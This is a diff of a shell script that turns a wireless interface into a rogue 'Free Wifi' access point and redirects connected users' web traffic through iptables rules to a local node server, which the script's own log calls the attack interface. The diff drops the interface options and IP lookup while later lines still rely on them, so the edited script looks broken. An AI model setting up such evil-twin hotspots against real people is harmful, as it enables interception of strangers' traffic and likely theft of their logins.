@@ -2,8 +2,8 @@
 # and will redirect all the traffic to the ip of the node server running on port 8000 and 8443
 
 print_usage(){
-    echo "Usage: ./rerouting_magic.sh --ap <FAKE_AP_INTERFACE> --net <net_interface> --ssid <ssid>"
-    echo "Example: ./rerouting_magic.sh --ap $FAKE_AP_INTERFACE --net wlp2s0 --ssid \"Free Wifi\""
+    echo "Usage: ./rerouting_magic.sh --ssid <ssid>"
+    echo "Example: ./rerouting_magic.sh --ssid \"Free Wifi\""
 }
 
 log(){
@@ -14,12 +14,6 @@ set -o errexit
 
 while [ "$1" != "" ]; do
     case $1 in
-        --ap )              shift
-                                FAKE_AP_INTERFACE=$1
-                                ;;
-        --net )                 shift
-                                NET_INTERFACE=$1
-                                ;;
         --ssid )                shift
                                 SSID=$1
                                 ;;
@@ -103,8 +97,6 @@ log "starting hostapd and isc-dhcp-server"
 service hostapd restart
 service isc-dhcp-server restart
 
-NET_IP=$(ifconfig $NET_INTERFACE | grep 'inet ' | awk '{print $2}')
-
 log "configuring iptables"
 iptables --table nat --flush
 iptables -t nat -A PREROUTING -i $FAKE_AP_INTERFACE -p udp --dport 80 -j DNAT --to-destination $NET_IP:8000
@@ -114,6 +106,6 @@ iptables -t nat -A PREROUTING -i $FAKE_AP_INTERFACE -p tcp --dport 443 -j DNAT -
 iptables -t nat -A POSTROUTING -o $NET_INTERFACE -j MASQUERADE
 
 log "starting node server"
-nohup npm run dev &
+cd active_portal; nohup npm run dev &; cd ../
 
 log "REROUTING MAGIC IS DONE. THE ATTACK INTERFACE IS NOW A WIFI ACCESS POINT WITH THE SSID: $SSID"
